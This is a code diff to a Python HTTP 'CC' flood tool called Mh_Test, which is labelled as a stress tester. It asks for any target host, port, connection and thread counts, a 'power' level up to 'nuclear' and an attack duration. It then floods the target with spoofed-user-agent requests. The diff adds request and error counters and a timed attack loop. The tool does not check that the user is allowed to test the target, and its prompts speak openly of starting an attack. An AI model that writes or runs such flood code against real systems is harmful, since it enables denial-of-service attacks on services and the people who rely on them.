@@ -2,7 +2,8 @@ import socket,sys,time
 import threading as th
 from random import choice,randint
 from tqdm import tqdm
-m,version='beta','0.0.1_b'
+from os import _exit
+m,version,m1='release','v0.0.1','(c)Copyrighgt 2025 _MhwsChina_'
 useragents=[
     'Java/21.0.3',
     'Python-urllib/2.5',
@@ -31,6 +32,16 @@ accepts=[
 lock,lock1=th.RLock(),th.RLock()
 clients=[]
 cindex=0
+qs,qe=0,0
+def fmnum(num):
+    tmp,tmp1=0,0
+    for a,b in [(1000000000000,'t'),(1000000000,'bn'),(1000000,'m'),(1000,'k')]:
+        if num>=a:
+            tmp='%.2f'%(num/a)
+            tmp1=b
+            break
+    if not tmp:return num
+    return (tmp.replace('.00','') if tmp.endswith('.00') else tmp)+b
 def getln(txt,typ=str,n=None,ls=[],err='输入不正确,请重新输入!'):
     while True:
         tmp=input(txt)
@@ -52,7 +63,7 @@ class mht_default(th.Thread):
     def __init__(self):
         th.Thread.__init__(self)
     def run(self):
-        global clients,cindex
+        global clients,cindex,qs,qe
         c=th.current_thread().name
         useragent='User-Agent: '+choice(useragents)+'\r\n'
         accept=choice(accepts)
@@ -70,14 +81,11 @@ class mht_default(th.Thread):
             cindex+=1
             lock.release()
             try:
-                log(f'[+] SEND PACKET @ {c}')
-                try:
-                    for tmp in range(cnt):
-                        client.send(req)
-                except:
-                    clients.append(create_client())
-                    del clients[tmpa]
+                for tmp in range(cnt):
+                    client.send(req)
+                    qs+=1
             except Exception as ad:
+                qe+=1
                 log(f'[-] @ {c} ',str(ad),mode='ERROR')
                 clients.append(create_client())
                 del clients[tmpa]
@@ -101,6 +109,7 @@ def sclient():
         cntmp1+=1
 log('Mh_Test',m,version)
 log('Mh cc压力测试工具')
+log('源码:https://github.com/MhwsChina/Mh_Test')
 ip=getln('IP/网址:').replace('http://','').replace('https://','')
 page=ip.split('/')
 page='/' if len(page)==1 else '/'+'/'.join(page[1:])
@@ -108,10 +117,11 @@ port=getln('PORT/端口:',int)
 cn=getln('CONNECT/连接数(1000):',int,1000)
 thread=getln('THREAD/发包线程(500):',int,500)
 cnt=getln('威力[(10=普通)(50=高)(100=核爆)]:',int,100)
+tm=getln('TIME/攻击持续时间:',int,60)
 log('创建连接')
 cntmp=list(range(cn))
 cntmp1=0
-cbar=tqdm(total=cn)
+cbar=tqdm(total=cn,ascii=True,dynamic_ncols=True)
 if thread>cn:thread=cn
 for i in range(thread):
     try:tth=th.Thread(target=sclient,name='create').start()
@@ -123,8 +133,24 @@ log(f'创建了{len(clients)}条连接')
 lock.acquire()
 log('启动线程')
 for i in range(thread):
-    try:tth=mht_default().start()
+    try:
+        mht_default().start()
     except:pass
 log('加载完毕')
 input('按下Enter开始攻击')
 lock.release()
+qss=0
+bar=tqdm(range(tm),ascii=True,dynamic_ncols=True)
+for i in bar:
+    time.sleep(1)
+    bar.set_postfix(send=fmnum(qs))
+    qss+=qs
+    qs=0
+bar.close()
+log('等待线程停止')
+lock.acquire()
+log('关闭连接')
+del clients
+log('压测完成')
+log(f'压测总时长:{tm},请求数:{fmnum(qss)},线程数:{thread},连接数:{cn},错误次数:{qe}')
+input('按Enter键退出...')
